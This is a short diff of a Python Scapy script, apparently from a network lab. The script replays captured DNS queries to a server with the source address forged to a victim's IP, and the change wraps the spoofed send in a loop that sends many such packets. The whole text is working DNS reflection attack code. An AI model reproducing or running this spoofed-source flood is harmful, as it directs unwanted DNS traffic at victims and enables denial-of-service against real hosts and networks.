@@ -51,15 +51,18 @@ def main():
         if pkt.qr == 0: # the packet is query
             q_pkt.append(pkt)
 
-    pkt = Ether(src=get_if_hwaddr(iface), dst='ff:ff:ff:ff:ff:ff')
-    pkt = pkt /IP(dst=addr, src=vic_addr) / UDP(dport=53, sport=random.randint(49152,65535)) / q_pkt[random.randint(0, len(q_pkt))].getlayer(DNS)
-    sendp(pkt, iface = iface, verbose=False)
+    N = input()
+    for i in range(0, N):
+        a = input()
+        pkt = Ether(src=get_if_hwaddr(iface), dst='ff:ff:ff:ff:ff:ff')
+        pkt = pkt /IP(dst=addr, src=vic_addr) / UDP(dport=53, sport=random.randint(49152,65535)) / q_pkt[a].getlayer(DNS)
+        sendp(pkt, iface = iface, verbose=False)
 
-    print pkt.show()
-    print "----"
-    sniff(iface = iface, 
-            prn = lambda x: handle_pkt(x),
-            count = 1)
+    #print pkt.show()
+    #print "----"
+    #sniff(iface = iface, 
+    #        prn = lambda x: handle_pkt(x),
+    #        count = 1)
 
 
 if __name__ == '__main__':
